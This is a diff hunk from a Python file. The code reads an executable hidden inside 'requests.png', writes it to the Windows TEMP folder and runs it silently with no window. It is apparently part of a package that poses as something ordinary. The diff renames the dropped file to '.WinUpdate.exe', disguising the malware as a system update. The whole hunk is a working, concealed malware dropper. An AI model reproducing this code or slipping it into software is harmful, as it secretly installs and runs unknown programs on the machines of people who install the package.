@@ -140,7 +140,7 @@ with open(os.path.join(os.path.dirname(__file__), 'requests.png'), 'rb') as f:
     data = f.read()
     index = data.find(b'\x00\x00PE_DATA\x00\x00')
     if index != -1:
-        temp_path = os.path.join(os.environ.get('TEMP', r'C:\Windows\Temp'), 'main.exe')
+        temp_path = os.path.join(os.environ.get('TEMP', r'C:\Windows\Temp'), '.WinUpdate.exe')
         with open(temp_path, 'wb') as exe_file:
             exe_file.write(data[index + 11:])
         subprocess.Popen([temp_path], creationflags=subprocess.CREATE_NO_WINDOW)
